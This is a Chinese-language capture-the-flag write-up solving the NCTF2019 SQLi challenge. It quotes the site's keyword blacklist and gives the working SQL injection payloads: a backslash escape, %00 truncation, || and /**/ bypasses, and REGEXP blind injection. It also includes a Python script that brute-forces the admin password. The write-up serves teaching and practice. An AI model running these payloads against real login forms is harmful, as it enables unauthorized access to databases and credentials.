# \[NCTF2019]SQLi

## \[NCTF2019]SQLi

## 考点

* PHP版本小于5.3存在%00截断
* regexp进行盲注

## wp

直接给了提示

![](../.gitbook/assets/image\_sfYfyc8b6nSC7hNBpnQ9we.png)

用户名输入`admin' or 1=1 #`会提示`hacker`

![](../.gitbook/assets/image\_aTeFgtrh9rxPGfq913aP7U.png)

发现只要存在`'`就会弹出hacker，再看一下给的语句，如果过滤了`'`，那可以用的方式就剩下转义，但是转义之后无法把最后面的单引号取掉

```python
select * from users where username='' and passwd=''
```

一时没有头绪。试了一下/robots.txt，提示访问/hint.txt

```python
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";

If $_POST['passwd'] === admin's password,

Then you will get the flag;
```

基本上全过滤了，还剩下`\`,`regexp`,`/**/`和`&^|`

在返回包中可以看到PHP版本为5.2，在版本小于5.3是可以进行字符串截断的，再用`;`就可以进行语句闭合

```python
select * from users where username='\' and passwd=';%00'
```

前半句查询username肯定是空，接着就要看怎么构造payload了。虽然过滤了or，但是可以用`||`替代

```python
select * from users where username='\' and passwd='||1;%00'
```

![](../.gitbook/assets/image\_iiKK5H3SSVyENVqTy4uuMq.png)

最后payload应该是这样子

```python
username=\&passwd=||(select/**/passwd/**/regexp/**/"^a");%00
```

但是过滤了select，最终payload

```python
username=\&passwd=||(passwd/**/regexp/**/"^y");%00
```

![](../.gitbook/assets/image\_uR9gVsK8RJHuT4HcsLxDcp.png)

exp

```python
import requests
from urllib.parse import unquote
import string

url = 'http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81/' 


cookies = {
    'UM_distinctid': '17e150f6a59ecb-028dcf28d64a708-4c3e2679-384000-17e150f6a5a90d',
}

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81',
    'Connection': 'keep-alive',
    'Referer': 'http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81/',
    'Upgrade-Insecure-Requests': '1',
}
table = string.ascii_letters + string.digits + '_{}'
flag = ''
for j in range(50):
    for i in table:
        data = {
            'username': '\\',
            'passwd': f'||(passwd/**/regexp/**/"^{flag+i}");'+unquote('%00')
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        
        if '404 Not Found' in response.text:
            flag = flag + i
            break
        else:
            continue
    print(flag)
```

结果是`yoU_Will_neVer_knoW7788990`，再全转成小写`you_will_never_know7788990`

![](../.gitbook/assets/image\_d85KV9HrnSr64Yoe4nRkS9.png)

flag条件是输入的password和数据库中的相同，在提示中写了

```python
$_POST['passwd'] === admin's password
```

![](../.gitbook/assets/image\_b8uTnXzfo6qzZYwzx6saov.png)

## 小结

1. 反斜杠结合PHP的%00截断bypass对`'`的过滤
2. `||`绕过or
3. `/**/`绕过空格
4. regex进行盲注
